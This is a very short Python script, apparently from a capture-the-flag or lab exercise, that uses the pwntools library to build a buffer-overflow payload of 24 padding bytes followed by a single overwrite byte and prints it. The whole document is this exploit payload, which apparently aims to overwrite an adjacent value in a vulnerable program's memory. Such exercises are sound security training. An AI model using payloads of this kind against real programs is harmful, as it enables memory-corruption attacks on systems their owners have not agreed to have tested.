from pwn import *

pay = b""
pay += b"A" * 24
pay += p8(2)

print(pay)